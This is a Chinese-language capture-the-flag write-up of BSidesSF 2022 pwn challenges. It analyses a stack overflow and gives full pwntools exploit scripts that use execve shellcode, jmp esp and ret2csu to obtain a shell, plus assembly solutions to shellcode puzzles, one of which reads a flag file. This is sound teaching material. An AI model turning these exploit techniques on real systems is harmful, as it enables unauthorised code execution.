---
title: BSidesSF 2022 CTF
date: 2022/6/5 20:46:25
tags:
 - PWN
categories:
 - BSidesCF
---

第一次打国外的比赛，由于好几道pwn题出的非常萌新，所以做起来比较舒服（我做出来了三道shellcode闯关和两道无保护的栈题）。其中有两道题的代码是一样的，一个是32位的，一个是64位的。整体利用思路一样，我就详细说一下32位的,64位的这个题同理。
<!--more-->
# Tutorial

## 保护策略：

<img src="https://s2.loli.net/2022/06/06/sNCMezaOjPIE9TB.png" alt="image-20220604212148738" style="width:50%;" />

只要看到没开NX，就往shellcode方面考虑。

## 漏洞分析：

![image-20220604212652290](https://s2.loli.net/2022/06/06/ravABjUV8EmO3f5.png)

这里程序泄露了好几个地址，并且还给了提示，说只能输入16进制的字符。结合提示继续往下分析。

<img src="https://s2.loli.net/2022/06/06/zrvmtiUA5u94wOF.png" alt="image-20220604212709635" style="width:50%;" />

程序正常可以无限次的read函数，每次可以输入0x40字节。

<img src="https://s2.loli.net/2022/06/06/peFn2xCfXPIG7qD.png" alt="image-20220604212728654" style="width: 33%;" />

（结合上图）发现这个buf并不能溢出，也不能干扰到任何数据。

<img src="https://s2.loli.net/2022/06/06/lXYNKCBTd16axVh.png" alt="image-20220605184815671" style="width:50%;" />

（结合上图）问题出在v2上面，由于read无限次被循环执行,v2却始终没有被清零，意味只要return不被触发，v2就这个下标无限制，可以一直往高地址去写入数据。再看一下decodehex这个函数（下图）

<img src="https://s2.loli.net/2022/06/06/bBkYuNg3m21ZMFH.png" alt="image-20220604212854398" style="width:50%;" />

发现这里有个检查，要确定我们输入的数据是否属于0~9 a~f A~F。如果不是在这个范围的话则会返回-1。

![image-20220605183435486](https://s2.loli.net/2022/06/06/zr6kZDycuvI7eba.png)

如果返回-1的话，这个主函数就会退出了，否则就可以把这个字符存在栈里的这个位置（如下图）

<img src="https://s2.loli.net/2022/06/06/XaKo4EHBMrRnkWS.png" alt="image-20220605183958746" style="width:50%;" />

可以发现这是在当前函数的返回地址下面，猛一看似乎感觉也不能修改当前函数的返回地址。不过调试一下就发现，challenge函数的返回地址在输入点的下面（这就意味着challenge函数的返回地址是可以被溢出修改的）结合上面分析的，v2没有被清零导致了数据可以无限往下输入造成溢出。

![image-20220605184725900](https://s2.loli.net/2022/06/06/nOcv46uWkPiCIo5.png)

## 利用思路：

由于没开NX，最后获取shell的方式考虑用shellcode，不过shellcode没法第一次就直接写进去，因为即使是用纯字符的shellcode，也无法绕过检查（检查只允许0-9 a-f A-F)，。我考虑过把shellcode放到0x40的一次输入里面，然后迁移过去执行，不过由于read一次只能读入0x40，而生成的shellcode有一百二十多个字节，因此这个方法也不行。**最终的方法是劫持执行流，再执行一次read函数（控制参数，劫持返回地址为jmp esp）把shellcode精准写到jmp esp下面的地址即可获取shell。**至于再输入的这个shellcode是字符型的还是字节流无所谓了。

<img src="https://s2.loli.net/2022/06/06/tr6YAaVousmU3c7.png" alt="image-20220605190520975" style="width: 50%;" />

<img src="https://s2.loli.net/2022/06/06/ypfbWhX5kPmlDrE.png" alt="image-20220605190652373" style="width:50%;" />

> 为什么要用jmp esp这个指令？
>
> ret指令相当于pop reip，如果执行ret指令时栈顶的内容是shellcode机器码，那么就会把机器码弹给eip，但是eip仅仅要的是一个指令的地址而已，你却弹给它了一个机器码，因此程序就会崩溃。所以需要用jmp esp，也就是跳转到esp中存储的地址处（也就是跳转到shellcode的地址），进而执行shellcode。
>
> 劫持执行流的偏移是怎么得到的？
>
> 这个通过IDA是看不出来（也可能是我比较菜QAQ），然后通过gdb去调试，输入一些垃圾字符，看看输入到多少的时候可以溢出到challenge的返回地址。

**需要注意的是，经过调试，写入栈里的地址数据是反着存储的，因此exp上写的地址应该反着写，存储的时候就正了。**

## EXP：

[tools源码](https://www.cnblogs.com/ZIKH26/articles/16307343.html)

```python
from tools import *
p,e,libc=load('a')
#p=remote('tutorial-f0115733.challenges.bsidessf.net',3232)
#debug(p,0x080492C7)
context.arch='i386'
shellcode=asm('''
xor ecx,ecx
xor edx,edx
xor ebx,ebx 
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
push 11
pop eax
int 0x80
''')
def re(a):
    '''由于栈地址是随机的，所以写了个函数将接收的栈地址给转换一下'''
    sum=0
    for i in range(4):
        b=(a>>(i*8))&0xff
        sum=b+sum*16*16
    return hex(sum)
p.recvuntil('EIP from the calling function is 0x804940f and saved at ')
leak_stack_addr=int(p.recv(10),16)
log('leak_stack_addr',hex(leak_stack_addr))
target_stack_addr=leak_stack_addr+0x8#调试一下，获取这个偏移
log('target_stack_addr',hex(target_stack_addr))
a=re(target_stack_addr)
print(a[2:])
payload='a'*60+'b'*60+'c'*48+'30900408'+'c9920408'+'00000000'+a[2:]+'00001000'
p.sendline(payload)
pause()
p.sendline(shellcode)
p.interactive()
```



<img src="https://s2.loli.net/2022/06/06/3ObNElsnd1YoCfz.png" alt="image-20220605200714258" style="width: 33%;" />





# Tutorial64

这道题和32位的思路是完全一样的，不一定的地方是执行read传参的时候要用一下ret2csu。

## EXP：

```python
from tools import *
p,e,libc=load('b')
p=remote('tutorial64-98df6ee7.challenges.bsidessf.net',6464)
#debug(p,0x40129A)
context.arch='amd64'
shellcode=asm('''
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi,rsi
xor rdx,rdx
syscall
''')
def re(a):
    sum=0
    for i in range(8):
        b=(a>>(i*8))&0xff
        sum=b+sum*16*16
    return hex(sum)
pop_rdi_addr=0x40142b
pop_rsi_r15_addr=0x401429
gadget1_addr=0x401422
gadget2_addr=0x401408
jmp_addr=0x80492c9
read_got_addr=e.got['read']
p.recvuntil('RIP from the calling function is 0x4013c1 and saved at ')
leak_stack_addr=int(p.recv(14),16)
log('leak_stack_addr',hex(leak_stack_addr))
target_stack_addr=leak_stack_addr+0x80
log('target_stack_addr',hex(target_stack_addr))
a=re(target_stack_addr)
print(a[2:])
payload='a'*60+'b'*60+'c'*56+re(gadget1_addr)[2:]
payload+='0000000000000000'#rbx
payload+='0100000000000000'#rbp
payload+='0000000000000000'#rdi
payload+=re(target_stack_addr)[2:]#rsi
payload+='0001000000000000'#rdx
payload+=re(read_got_addr)[2:]
payload+='0814400000000000'
payload+='0000000000000000'*7
payload+='9c12400000000000'
p.sendline(payload)
pause()
p.sendline(shellcode)
p.interactive()
```

<img src="https://s2.loli.net/2022/06/06/KJP2xTnkAZNQiuC.png" alt="image-20220605201640972" style="width: 33%;" />



# shurdles1

然后是shellcode闯关题，对于我这种萌新来说做起来还是比较有意思的。

题目就给了个ip和port，连上去直接开始闯关。

<img src="https://s2.loli.net/2022/06/06/Uh2oY3sAGJp1rZX.png" alt="image-20220605202310129" style="width: 33%;" />

## 第一关

<img src="https://s2.loli.net/2022/06/06/igHeP8r7IaNRJxc.png" alt="image-20220605202357671" style="width: 50%;" />

这个就是让你明确写法格式，照着输入即可。

```assembly
xor rax, rax
ret
.
```

这个地方.是核心（这个.困扰我了很久很久，最后才发现这里的问题），或者输入机器码也行，不过我一直写的是汇编。

## 第二关

<img src="[BSidesSF 2022 CTF].assets/image-20220605202624255.png" alt="image-20220605202624255" style="width:50%;" />

这一关想让你返回1，这就意味着你的rax寄存器里要是1，然后使用ret返回。

```assembly
mov rax,1
ret
.
```

## 第三关

<img src="[BSidesSF 2022 CTF].assets/image-20220605203041589.png" alt="image-20220605203041589" style="width:50%;" />

这次是想让返回值是2，但是不想让你使用ret指令来完成。给的提示是使用系统调用exit。查一下系统调用号，然后给rdi传参为2，rax放成60(exit的系统调用号)

```assembly
mov rax,60
mov rdi,2
syscall
.
```

## 第四关

![image-20220605203440517](https://s2.loli.net/2022/06/06/GwDtq9f7nXhjNsd.png)

这次想让返回值为3（can you exit with code 3)这句其实我也不知道咋翻译比较准确，反正我这勉强及格的英语水平能明白它意思，但是描述不是很清楚。

同时你不可以使用ret或者syscall指令。给的提示是让使用pop 和jmp来做到这一点。

ret指令相当于pop rip再跳转到rip。不能使用ret，就可以把这个指令拆开实现。先pop 一个寄存器，然后再jmp跳转过去，其实就等同于ret指令了。

```assembly
mov rax,3
pop rdi
jmp rdi
.
```

<img src="https://s2.loli.net/2022/06/06/wph5IjqnS7A9VJy.png" alt="image-20220605204139956" style="width:50%;" />



# shurdles2

## 第一关

<img src="https://s2.loli.net/2022/06/06/Z98uboqdszTUBG7.png" alt="image-20220605204233997" style="width:50%;" />

这一关是想让地址0x12345678出崩溃，给的提示说jmp跳转到这个地址就可以让它崩溃了。

```assembly
mov rax,0x12345678
jmp rax
.
```

## 第二关

<img src="https://s2.loli.net/2022/06/06/goFt8GphHWMBiDb.png" alt="image-20220605204431458" style="width:50%;" />

这次人家不让用jmp了，想让用ret。

因为ret是pop rip，所以我们提前把这个0x12345678压到栈顶，然后ret即可。

```assembly
push 0x12345678
ret
.
```

## 第三关

<img src="https://s2.loli.net/2022/06/06/c39LyubpJG6kglx.png" alt="image-20220605204625021" style="width: 50%;" />

这一关想让你把字符串的地址保存在一个寄存器里，然后把寄存器作为返回值返回了。

**汇编语言中DB是定义单字节数据段的意思，编译时DB后面的数据将视为纯数据而不是指令代码**

按照给的提示，call会把下一条指令的地址压栈（**也就是把字符串给压栈了**），然后进行了近调用（去执行below里的内容），然后执行了pop rdi**（也就是把字符串的地址弹到了rdi里面）**，拿到了字符串的地址，然后将其赋值给rax，然后ret即可。

```assembly
call below
db "BSides San Francisco",0
below:
pop rdi
mov rax,rdi
ret
.
```

<img src="https://s2.loli.net/2022/06/06/IfwjcV6CbGMQN8n.png" alt="image-20220605205330512" style="width:50%;" />

# shurdles3

## 第一关

<img src="https://s2.loli.net/2022/06/06/nqYRJirNV2seDm5.png" alt="image-20220605205852136" style="width:50%;" />

这个很简单，之前也做过了，就是要使用exit退出时的代码为123。

```assembly
mov rax,60
mov rdi,123
syscall
.
```

## 第二关

<img src="https://s2.loli.net/2022/06/06/CF6o7kVvJp5sXDA.png" alt="image-20220605210132746" style="width:50%;" />

想系统调用write，然后将Hello,BSides!这句话打印出来并且使用exit退出。

```assembly
call write
db "Hello, BSides!",0 
write:
pop rsi
mov rdi,1
mov rdx,14
mov rax,1
syscall
mov rax,60
xor rdx,rdx
syscall
.
```

## 第三关

<img src="https://s2.loli.net/2022/06/06/mWKTz8U1xRbM6dq.png" alt="image-20220605210723155" style="width:50%;" />

此时来到了最后一关。

想让我们用open,read,write来读出flag并且进行退出（人家还说Be sure to exit cleanly，我这个英语渣渣认为是要用ret返回并且返回值为0）。flag位于/app/level2.yaml

那这题不就和打宝宝一样简单么。**需要注意的是人家提示说open返回的这个文件描述符是随机的，并不是3，所以这里要用mov把rax里装的返回值给传过来**

```assembly
call below
db "/app/level2.yaml",0
below:
pop rdi
mov rax,2
mov rsi,0
syscall
mov rdi,rax
mov rsi,rsp
sub rsi,60
push 48
pop rdx
push 0
pop rax
syscall
mov rdi,1
mov rsi,rsp
sub rsi,60
mov rdx,48
mov rax,1
syscall
mov rax,0
ret
.
```

<img src="https://s2.loli.net/2022/06/06/zOueQdn7YsKtD6g.png" alt="image-20220605211437993" style="width:50%;" />